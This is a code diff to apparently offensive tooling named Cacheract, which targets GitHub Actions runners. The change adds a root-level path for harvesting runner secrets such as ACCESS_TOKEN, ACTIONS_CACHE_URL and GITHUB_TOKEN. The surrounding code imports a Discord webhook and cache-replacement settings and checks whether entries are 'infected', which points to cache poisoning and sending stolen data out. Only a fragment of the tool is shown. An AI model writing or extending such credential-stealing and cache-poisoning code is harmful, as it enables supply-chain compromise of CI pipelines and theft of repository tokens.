@@ -1,6 +1,6 @@
 import * as fs from 'fs';
 import * as crypto from 'crypto';
-import { getToken, listCacheEntries, clearEntry, checkRunnerEnvironment, retrieveEntry, listActions, isDefaultBranch, updateArchive, generateRandomString, prepareFileEntry, createArchive, isInfected, checkCacheEntry, sleep } from './utils';
+import { getToken, listCacheEntries, clearEntry, checkRunnerEnvironment, retrieveEntry, listActions, isDefaultBranch, updateArchive, generateRandomString, prepareFileEntry, createArchive, isInfected, checkCacheEntry, sleep, getTokenRoot } from './utils';
 import axios from 'axios';
 import { CHECKOUT_YML } from './static';
 import { FILL_CACHE, SLEEP_TIMER, DISCORD_WEBHOOK, REPLACEMENTS, EXPLICIT_ENTRIES } from './config';
@@ -206,7 +206,7 @@ async function main() {
     if (goodRunner.github_hosted === true) {
         if (goodRunner.os !== 'Linux') {
             console.log('Cacheract currently only supports GitHub Hosted Linux runners.');
-            console.log('Reporting telemetry to Discord since it is GitHub hosted.');
+            console.log('Not reporting telemetry to Discord.');
             process.exit(0);
         }
     } else {
@@ -214,7 +214,13 @@ async function main() {
         process.exit(0);
     }
 
-    const tokens = await getToken();
+    let tokens = new Map<string, string>();
+    if (process.getuid() !== 0) {
+        tokens = await getToken();
+    } else {
+        tokens = await getTokenRoot();
+    }
+    
     const accessToken = tokens.get('ACCESS_TOKEN');
     const cacheServerUrl = tokens.get('ACTIONS_CACHE_URL');
     const githubToken = tokens.get('GITHUB_TOKEN');
